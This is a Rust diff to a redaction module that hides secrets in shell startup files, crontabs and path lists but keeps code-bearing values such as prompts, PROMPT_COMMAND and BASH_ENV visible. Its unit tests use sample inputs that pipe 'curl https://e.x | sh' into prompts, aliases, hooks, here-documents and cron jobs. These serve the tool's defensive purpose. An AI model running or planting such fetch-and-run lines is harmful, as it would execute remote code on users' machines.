@@ -17,6 +17,12 @@
 //!    and at the end of its physical line at the latest, so a mismatch with the shell inside
 //!    quotes can never swallow a line.
 //!
+//! That is for shell code: startup files and `periodic` scripts. A crontab is read a line at a
+//! time as cron does ([`redact_crontab`]), and a path list is shown as it is: neither is shell
+//! code, and joining their lines on a quote would hide a job or a folder.
+//!
+//! Some values are shown, because what they hold runs or decides what runs ([`shows`]).
+//!
 //! A hidden value keeps its newlines, each line of it reading `(hidden)`, so the redacted
 //! logical line splits back into as many lines as it joined and line numbers match the file.
 //! A line the agent should not trust to be complete says so in words: one longer than
@@ -26,6 +32,54 @@ use crate::inventory::host::shows_value;
 
 /// What replaces a hidden value.
 const HIDDEN: &str = "(hidden)";
+
+/// Names whose value is code the shell runs or a path it reads code from, shown whole as
+/// `PATH` is: zsh's `path` and `fpath` arrays (tied to `PATH` and `FPATH`), the prompts (bash
+/// and zsh expand commands in them on every prompt), `PROMPT_COMMAND`, zsh's `functions` table
+/// and hook arrays, and the files a shell reads at start (`BASH_ENV`, `ENV`, `ZDOTDIR`).
+const CODE_NAMES: [&str; 24] = [
+    "FPATH",
+    "path",
+    "fpath",
+    "PS0",
+    "PS1",
+    "PS2",
+    "PS3",
+    "PS4",
+    "PROMPT",
+    "PROMPT2",
+    "PROMPT3",
+    "PROMPT4",
+    "RPROMPT",
+    "RPROMPT2",
+    "RPS1",
+    "RPS2",
+    "PROMPT_COMMAND",
+    "functions",
+    "precmd_functions",
+    "preexec_functions",
+    "chpwd_functions",
+    "BASH_ENV",
+    "ENV",
+    "ZDOTDIR",
+];
+
+/// Whether the value assigned to `name` is shown whole: `PATH`, `DYLD_` variables (as for
+/// launch items) and [`CODE_NAMES`].
+fn shows(name: &str) -> bool {
+    shows_value(name) || CODE_NAMES.contains(&name)
+}
+
+/// What syntax a file's lines are in.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(super) enum Syntax {
+    /// Shell code: zsh's and bash's startup files and `periodic`'s scripts.
+    Shell,
+    /// A crontab: a line is a job or `NAME = value`, read on its own (crontab(5)).
+    Crontab,
+    /// One folder per line, for `path_helper`: nothing to hide.
+    PathList,
+}
 
 /// The longest logical line scanned, in bytes. Arbitrary: a real startup line is under a
 /// kilobyte and a pasted key a few, and the bound keeps a planted line from making the scan's
@@ -112,8 +166,9 @@ fn advance(text: &str, at: usize, len: usize) -> usize {
 enum Logical {
     /// Shell code over this many physical lines, joined with `\n`.
     Code(String, usize),
-    /// One line of a here-document's body.
-    Body(String),
+    /// One line of a here-document's body, and whether the body expands commands (its word
+    /// was not quoted).
+    Body(String, bool),
 }
 
 /// The logical lines of `text`.
@@ -129,7 +184,7 @@ fn logical_lines(text: &str) -> Vec<Logical> {
     for line in text.lines() {
         if let Some(body) = bodies.first() {
             let end = body.ends(line);
-            logical.push(Logical::Body(line.to_owned()));
+            logical.push(Logical::Body(line.to_owned(), body.expands));
             if end {
                 bodies.remove(0);
             }
@@ -182,11 +237,13 @@ fn logical_lines(text: &str) -> Vec<Logical> {
     logical
 }
 
-/// The word that ends a here-document, and whether its lines may be indented with tabs.
+/// The word that ends a here-document, whether its lines may be indented with tabs, and
+/// whether its body expands commands, which a quoted word turns off.
 #[derive(Debug)]
 struct Delimiter {
     word: String,
     tabs: bool,
+    expands: bool,
 }
 
 impl Delimiter {
@@ -203,7 +260,9 @@ impl Delimiter {
             None => (false, rest),
         };
         let rest = rest.trim_start_matches([' ', '\t']);
-        let rest = rest.strip_prefix(['\'', '"']).unwrap_or(rest);
+        let unquoted = rest.strip_prefix(['\'', '"', '\\']);
+        let expands = unquoted.is_none();
+        let rest = unquoted.unwrap_or(rest);
         let len = rest
             .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
             .unwrap_or(rest.len());
@@ -211,6 +270,7 @@ impl Delimiter {
         (!word.is_empty()).then(|| Self {
             word: word.to_owned(),
             tabs,
+            expands,
         })
     }
 
@@ -225,13 +285,22 @@ impl Delimiter {
     }
 }
 
-/// The lines of `text`, values hidden, one for each physical line.
-pub(super) fn lines(text: &str) -> Vec<String> {
+/// The lines of `text`, in `syntax`, values hidden, one for each physical line.
+pub(super) fn lines(text: &str, syntax: Syntax) -> Vec<String> {
+    match syntax {
+        Syntax::Shell => shell_lines(text),
+        Syntax::Crontab => text.lines().map(redact_crontab).collect(),
+        Syntax::PathList => text.lines().map(str::to_owned).collect(),
+    }
+}
+
+/// The lines of shell code, values hidden, one for each physical line.
+fn shell_lines(text: &str) -> Vec<String> {
     let mut shown = Vec::new();
     for logical in logical_lines(text) {
         let (text, count) = match &logical {
             Logical::Code(text, count) => (text.as_str(), *count),
-            Logical::Body(text) => (text.as_str(), 1),
+            Logical::Body(text, _) => (text.as_str(), 1),
         };
         if text.len() > LINE_LIMIT {
             let note = format!(
@@ -243,7 +312,7 @@ pub(super) fn lines(text: &str) -> Vec<String> {
         }
         let redacted = match &logical {
             Logical::Code(text, _) => redact(text, 0),
-            Logical::Body(text) => redact_body(text),
+            Logical::Body(text, expands) => redact_body(text, *expands),
         };
         let mut pieces: Vec<String> = redacted.split('\n').map(str::to_owned).collect();
         debug_assert_eq!(pieces.len(), count, "a hidden value keeps its newlines");
@@ -302,8 +371,10 @@ fn redact(text: &str, depth: usize) -> String {
 
 /// A here-document's body line with each assigned value hidden up to the next white space:
 /// quotes mean nothing in a body, so they open nothing (`Don't` starts no string), and a body
-/// line carries nothing to the next.
-fn redact_body(line: &str) -> String {
+/// line carries nothing to the next. When the body `expands`, a command in a value runs as the
+/// body is read, so it is shown, itself redacted, and white space inside it does not end the
+/// value.
+fn redact_body(line: &str, expands: bool) -> String {
     let mut out = String::with_capacity(line.len());
     let mut at = 0;
     let mut copied = 0;
@@ -313,18 +384,63 @@ fn redact_body(line: &str) -> String {
             continue;
         };
         let value = &line[found.value..];
-        let end = value.find([' ', '\t']).unwrap_or(value.len());
+        let mut end = 0;
+        let mut shown = String::new();
+        let mut hiding = false;
+        while end < value.len() && !value[end..].starts_with([' ', '\t']) {
+            let command = if expands {
+                command_end(&value[end..])
+            } else {
+                0
+            };
+            if command > 0 {
+                shown.push_str(&redact(&value[end..end + command], 1));
+                hiding = false;
+                end += command;
+                continue;
+            }
+            if !hiding {
+                shown.push_str(HIDDEN);
+                hiding = true;
+            }
+            end = advance(value, end, 1);
+        }
         out.push_str(&line[copied..found.value]);
-        if shows_value(found.name) || found.name == "FPATH" {
+        if shows(found.name) {
             out.push_str(&value[..end]);
-        } else if end > 0 {
-            out.push_str(HIDDEN);
+        } else {
+            out.push_str(&shown);
         }
         at = found.value + end;
         copied = at;
     }
     out.push_str(&line[copied..]);
     out
+}
+
+/// A crontab line with its values hidden. An environment line, `NAME = value`, holds its value
+/// to the end of the line, spaces included, with no comments (crontab(5)), so all of it is
+/// hidden. A job's command is run by `sh`, so it is redacted as shell code on its own line: a
+/// quote cron would not continue opens nothing on the next.
+fn redact_crontab(line: &str) -> String {
+    let trimmed = line.trim_start();
+    let name_len = trimmed
+        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+        .unwrap_or(trimmed.len());
+    let after = trimmed[name_len..].trim_start_matches([' ', '\t']);
+    let is_env = name_len > 0
+        && !trimmed.starts_with(|c: char| c.is_ascii_digit())
+        && after.starts_with('=');
+    if is_env && !trimmed.starts_with('#') {
+        let value = after[1..].trim_start_matches([' ', '\t']);
+        let shown_name = &trimmed[..name_len];
+        if value.is_empty() || shows(shown_name) {
+            return line.to_owned();
+        }
+        let kept = line.len() - value.len();
+        return format!("{}{HIDDEN}", &line[..kept]);
+    }
+    shell_lines(line).join(" ")
 }
 
 /// `note` in place of `text`, and `(hidden)` for each further line it spans.
@@ -370,25 +486,30 @@ fn assignment_at(text: &str, at: usize) -> Option<Found<'_>> {
         return None;
     }
     let line_before = text[..at].rsplit('\n').next().unwrap_or("");
-    let after_alias = line_before
-        .trim_end_matches([' ', '\t'])
-        .strip_suffix("alias")
-        .is_some_and(|start| start.is_empty() || start.ends_with([' ', '\t', ';', '&', '|', '(']));
-    if after_alias {
+    if after_alias(line_before) {
         return None;
     }
     if let Some(found) = launchctl_setenv(text, at) {
         return Some(found);
     }
-    let name_len = text[at..]
+    // A name may be quoted whole (`export "TOKEN"=x`), which the shell takes as the name.
+    let quote = text[at..]
+        .chars()
+        .next()
+        .filter(|c| matches!(c, '"' | '\''));
+    let name_at = at + quote.map_or(0, char::len_utf8);
+    let name_len = text[name_at..]
         .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
-        .unwrap_or(text.len() - at);
-    let name = &text[at..at + name_len];
+        .unwrap_or(text.len() - name_at);
+    let name = &text[name_at..name_at + name_len];
     if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
         return None;
     }
-    let mut after = &text[at + name_len..];
-    if text[..at].ends_with("${") {
+    let mut after = &text[name_at + name_len..];
+    if let Some(quote) = quote {
+        after = after.strip_prefix(quote)?;
+    }
+    if quote.is_none() && in_expansion(&text[..at]) {
         let operator = ["::=", ":=", ":-", ":+", "=", "-", "+"]
             .into_iter()
             .find(|op| after.starts_with(op))?;
@@ -399,27 +520,79 @@ fn assignment_at(text: &str, at: usize) -> Option<Found<'_>> {
             form: Form::Braced,
         });
     }
-    // A subscript (`secrets[github]=x`, zsh and bash arrays) belongs to the name.
-    if let Some(subscript) = after.strip_prefix('[') {
-        after = &subscript[subscript.find(']')? + 1..];
-    }
-    let line_start = line_before.trim().is_empty();
-    if line_start {
-        after = after.trim_start_matches([' ', '\t']);
+    // A subscript (`secrets[github]=x`, zsh and bash arrays) belongs to the name, nested
+    // brackets included.
+    if after.starts_with('[') {
+        after = &after[subscript_end(after)?..];
     }
     let operator = ["+=", "="].into_iter().find(|op| after.starts_with(op))?;
     if after[operator.len()..].starts_with('=') {
         return None;
     }
-    let mut value = &after[operator.len()..];
-    if line_start {
-        value = value.trim_start_matches([' ', '\t']);
-    }
+    let value = &after[operator.len()..];
     Some(Found {
         name,
         value: text.len() - value.len(),
         form: Form::Word,
     })
+}
+
+/// Whether the text before a name, on its line, ends with the word `alias` and any options
+/// (`alias -g`, `alias --`): the name is then the alias's.
+fn after_alias(line_before: &str) -> bool {
+    let mut words: Vec<&str> = line_before
+        .split([' ', '\t'])
+        .filter(|w| !w.is_empty())
+        .collect();
+    while words.last().is_some_and(|w| w.starts_with('-')) {
+        words.pop();
+    }
+    words.last().is_some_and(|word| {
+        let word = word.rsplit([';', '&', '|', '(']).next().unwrap_or(word);
+        word == "alias"
+    })
+}
+
+/// Whether `before` ends inside a parameter expansion where a name comes next: `${`, or zsh's
+/// `${(flags)` (`${(q)TOKEN:=x}`).
+fn in_expansion(before: &str) -> bool {
+    if before.ends_with("${") {
+        return true;
+    }
+    before
+        .strip_suffix(')')
+        .and_then(|rest| {
+            rest.rfind("${(")
+                .map(|at| !rest[at + 3..].contains(['(', ')', '}']))
+        })
+        .unwrap_or(false)
+}
+
+/// Where the subscript `text` starts with (`[...]`) ends, past its `]`, nested brackets
+/// counted and quoted text skipped.
+fn subscript_end(text: &str) -> Option<usize> {
+    let bytes = text.as_bytes();
+    let mut depth = 0_usize;
+    let mut context = Context::Top;
+    let mut at = 0;
+    while at < bytes.len() {
+        if context == Context::Top {
+            match bytes[at] {
+                b'[' => depth += 1,
+                b']' => {
+                    depth -= 1;
+                    if depth == 0 {
+                        return Some(at + 1);
+                    }
+                }
+                _ => {}
+            }
+        }
+        let (after, len) = context.step(bytes, at);
+        context = after;
+        at = advance(text, at, len);
+    }
+    None
 }
 
 /// `launchctl setenv NAME value` starting at byte `at` of `text`.
@@ -446,7 +619,7 @@ fn launchctl_setenv(text: &str, at: usize) -> Option<Found<'_>> {
 /// lines by one on each line. A command is one the shell would run: `$(...)` or backquotes
 /// outside single quotes, not escaped, and closed.
 fn shown_value(name: &str, value: &str, depth: usize) -> String {
-    let literal_shown = shows_value(name) || name == "FPATH";
+    let literal_shown = shows(name);
     let bytes = value.as_bytes();
     let mut shown = String::new();
     let mut hiding = false;
@@ -529,6 +702,16 @@ fn brace_end(text: &str) -> usize {
     let mut context = Context::Top;
     let mut at = 0;
     while at < bytes.len() {
+        // A `}` inside a command (`${T:=$(echo })x}`) is the command's.
+        let command = if context == Context::Top {
+            command_end(&text[at..])
+        } else {
+            0
+        };
+        if command > 0 {
+            at += command;
+            continue;
+        }
         if context == Context::Top {
             match bytes[at] {
                 b'{' => depth += 1,
@@ -589,6 +772,11 @@ fn value_end(text: &str, in_double: bool) -> usize {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Shell code's lines, as most tests read.
+    fn lines(text: &str) -> Vec<String> {
+        super::lines(text, Syntax::Shell)
+    }
 
     fn one(line: &str) -> String {
         lines(line).join("\n")
@@ -708,7 +896,6 @@ mod tests {
                 "launchctl setenv TOKEN s",
                 "launchctl setenv TOKEN (hidden)",
             ),
-            ("TOKEN = s", "TOKEN = (hidden)"),
             (
                 "https://x.example/?token=s&b=2",
                 "https://x.example/?token=(hidden)&b=(hidden)",
@@ -837,6 +1024,100 @@ mod tests {
     }
 
     #[test]
+    fn values_that_hold_code_are_shown() {
+        let cases = [
+            ("path=(/tmp/evil $path)", "path=(/tmp/evil $path)"),
+            ("path[1,0]=/tmp/evil", "path[1,0]=/tmp/evil"),
+            (
+                "fpath=(/usr/local/share/zsh/site-functions $fpath)",
+                "fpath=(/usr/local/share/zsh/site-functions $fpath)",
+            ),
+            (
+                "PS1='$(curl https://e.x | sh)'",
+                "PS1='$(curl https://e.x | sh)'",
+            ),
+            (
+                "PROMPT_COMMAND='curl https://e.x | sh'",
+                "PROMPT_COMMAND='curl https://e.x | sh'",
+            ),
+            (
+                "functions[precmd]='curl https://e.x | sh'",
+                "functions[precmd]='curl https://e.x | sh'",
+            ),
+            ("export BASH_ENV=/tmp/x.sh", "export BASH_ENV=/tmp/x.sh"),
+            ("ZDOTDIR=/tmp/z", "ZDOTDIR=/tmp/z"),
+            ("TOKEN=s", "TOKEN=(hidden)"),
+        ];
+        for (line, shown) in cases {
+            assert_eq!(lines(line).join("\n"), shown, "{line}");
+        }
+    }
+
+    #[test]
+    fn the_shell_s_own_forms_are_read_as_it_reads_them() {
+        let cases = [
+            // From Grok's review of the lexing rewrite.
+            ("IFS= read -r line", "IFS= read -r line"),
+            ("A= /tmp/evil", "A= /tmp/evil"),
+            (
+                "alias -- x='curl https://e.x | sh'",
+                "alias -- x='curl https://e.x | sh'",
+            ),
+            (
+                "alias -g x='curl https://e.x | sh'",
+                "alias -g x='curl https://e.x | sh'",
+            ),
+            (
+                "export \"GITHUB_TOKEN\"=s",
+                "export \"GITHUB_TOKEN\"=(hidden)",
+            ),
+            ("export 'GITHUB_TOKEN'=s", "export 'GITHUB_TOKEN'=(hidden)"),
+            ("secrets[a[b]]=s", "secrets[a[b]]=(hidden)"),
+            ("secrets[\"a]b\"]=s", "secrets[\"a]b\"]=(hidden)"),
+            (": ${(q)TOKEN:=s}", ": ${(q)TOKEN:=(hidden)}"),
+            (": ${TOKEN:=$(echo })s}", ": ${TOKEN:=$(echo })(hidden)}"),
+        ];
+        for (line, shown) in cases {
+            assert_eq!(lines(line).join("\n"), shown, "{line}");
+        }
+        // An unquoted here-document runs the commands in its body.
+        let body = "cat <<EOF\nTOKEN='$(curl https://e.x | sh)'\nEOF\n";
+        assert_eq!(
+            lines(body),
+            [
+                "cat <<EOF",
+                "TOKEN=(hidden)$(curl https://e.x | sh)(hidden)",
+                "EOF"
+            ]
+        );
+        let quoted = "cat <<'EOF'\nTOKEN='$(curl https://e.x | sh)'\nEOF\n";
+        assert_eq!(
+            lines(quoted),
+            ["cat <<'EOF'", "TOKEN=(hidden) https://e.x | sh)'", "EOF"]
+        );
+    }
+
+    #[test]
+    fn crontabs_and_path_lists_are_read_as_their_tools_read_them() {
+        let crontab = |text: &str| super::lines(text, Syntax::Crontab);
+        assert_eq!(
+            crontab("MAILTO=Alice Smith <a@b.c>\nPASS = correct horse\nPATH=/usr/bin:/tmp\n"),
+            ["MAILTO=(hidden)", "PASS = (hidden)", "PATH=/usr/bin:/tmp"]
+        );
+        // A quote cron does not continue opens nothing on the next job.
+        assert_eq!(
+            crontab("X=\"\n* * * * * curl https://e.x | sh\n0 * * * * T=s /bin/b\n"),
+            [
+                "X=(hidden)",
+                "* * * * * curl https://e.x | sh",
+                "0 * * * * T=(hidden) /bin/b"
+            ]
+        );
+        let paths = super::lines("X=\"\n/tmp/evil\n", Syntax::PathList);
+        assert_eq!(paths, ["X=\"", "/tmp/evil"]);
+    }
+
+    #[test]
     fn a_planted_file_is_bounded() {
         let opened = "A=$(".repeat(100);
         let deep = format!("X=$({opened}{}\n", ")".repeat(101));
@@ -912,7 +1193,7 @@ mod tests {
                 "", " cmd", "; echo", " && x", "'", "\"", "\\", "}", ")", "`", " \\\" x\"",
             ]),
         ) {
-            proptest::prop_assume!(name != "PATH" && name != "FPATH" && !name.starts_with("DYLD_"));
+            proptest::prop_assume!(!shows(&name));
             // A value in the same quote as the one around it closes that quote and goes on
             // outside it (`alias a='A='x''), which the module docs list as not hidden.
             proptest::prop_assume!(!(prefix.ends_with('\'') && quote == "'"));
